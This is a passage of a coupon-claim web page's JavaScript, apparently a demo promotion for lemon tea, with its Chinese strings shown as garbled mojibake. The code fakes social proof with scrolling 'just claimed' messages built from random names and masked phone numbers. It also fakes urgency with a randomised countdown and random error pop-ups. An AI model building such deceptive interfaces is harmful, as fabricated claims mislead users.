  if (submitBtn.disabled || !isVerifySuccess) return;
  
  const phone = phoneEl.value.trim();
  const code = codeEl.value.trim();
  
  if (code.length < 4) {
    codeEl.classList.add('input-error');
    showToast('è¯·è¾“å…¥æœ‰æ•ˆçš„éªŒè¯ç ');
    return;
  }
  
  // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
  submitBtn.disabled = true;
  submitBtn.classList.add('loading');
  showLoading('é›ªç‹æ­£åœ¨åŠªåŠ›æ”€çˆ¬ä¸­...');
  
  // æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚
  setTimeout(() => {
    hideLoading();
    submitBtn.classList.remove('loading');
    submitBtn.disabled = false;
    
    // æ¨¡æ‹ŸæˆåŠŸé¢†å–
    claimed++;
    remaining--;
    updateProgress();
    
    // æ’’èŠ±åº†ç¥
    createConfetti();
    
    // æ˜¾ç¤ºæˆåŠŸæç¤º
    showToast('ğŸ‰ æ­å–œï¼æˆåŠŸé¢†å–æŸ æª¬èŒ¶ä¼˜æƒ åˆ¸ï¼');
    
    // å¼¹å¹•æ•ˆæœ
    shootBarrage(phone);
    
    // é‡ç½®è¡¨å•
    phoneEl.value = '';
    codeEl.value = '';
    submitBtn.style.display = 'none';
    verifySlider.classList.remove('show');
    isVerifySuccess = false;
    resetSlider();
    checkPhoneValid();
  }, 2000);
});

// å¼¹å¹•æ•ˆæœ
function shootBarrage(customPhone = null) {
  const barrageBox = document.getElementById('barrageBox');
  const phonePrefixes = ['130','131','132','133','134','135','136','137','138','139'];
  const surnames = ['ç‹','æ','å¼ ','åˆ˜','é™ˆ','æ¨','èµµ','é»„','å‘¨','å´'];
  
  let phoneDisplay = customPhone && /^1[3-9]\d{9}$/.test(customPhone)
    ? customPhone.slice(0,3) + "****" + customPhone.slice(-4)
    : phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)] + "****" + (1000 + Math.floor(Math.random() * 9000));

  const surname = surnames[Math.floor(Math.random() * surnames.length)];
  const item = document.createElement('div');
  item.className = 'barrage-item';
  item.textContent = `${surname}* ${phoneDisplay} åˆšåˆšé¢†å–æˆåŠŸï¼`;
  
  const randomTop = 5 + Math.floor(Math.random() * 40);
  item.style.top = randomTop + 'px';
  
  const randomDuration = 8 + Math.random() * 4;
  item.style.animationDuration = randomDuration + 's';

  barrageBox.appendChild(item);
  setTimeout(() => item.remove(), randomDuration * 1000);
}

// å…¨å±€å€’è®¡æ—¶
function startGlobalCountdown() {
  let remain = (120 + Math.floor(Math.random() * 150)) * 60;
  const timerEl = document.getElementById('globalTimer');

  const tick = () => {
    if (remain <= 0) {
      timerEl.textContent = "æœ¬è½®å·²ç»“æŸï¼Œæ­£åœ¨è¿›å…¥ä¸‹ä¸€è½®...";
      setTimeout(() => location.reload(), 2500);
      return;
    }
    const h = Math.floor(remain / 3600).toString().padStart(2, '0');
    const m = Math.floor((remain % 3600) / 60).toString().padStart(2, '0');
    const s = (remain % 60).toString().padStart(2, '0');
    timerEl.textContent = `æœ¬è½®åé¢å€’è®¡æ—¶ï¼š${h}:${m}:${s}`;
    remain--;
  };

  tick();
  setInterval(tick, 1000);
}

// Toastæç¤º
function showToast(message) {
  const toast = document.createElement('div');
  toast.textContent = message;
  toast.style.cssText = `
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,0,0,0.8);
    color: white;
    padding: 12px 24px;
    border-radius: 24px;
    font-size: 0.9rem;
    z-index: 10001;
    animation: slideDown 0.3s ease;
  `;
  
  document.body.appendChild(toast);
  
  setTimeout(() => {
    toast.style.animation = 'fadeOut 0.3s ease forwards';
    setTimeout(() => toast.remove(), 300);
  }, 2000);
}

// è‡ªåŠ¨å¼¹å¹•
setInterval(() => {
  shootBarrage();
}, 4000);

// åˆå§‹åŒ–
createSnow();
updateProgress();
startGlobalCountdown();

// éšæœºæ˜¾ç¤ºç½‘ç»œé”™è¯¯ï¼ˆæ¼”ç¤ºç”¨ï¼‰
setTimeout(() => {
  if (Math.random() > 0.7) {
    showNetworkError();
  }
}, 10000);
</script>
</body>
</html>
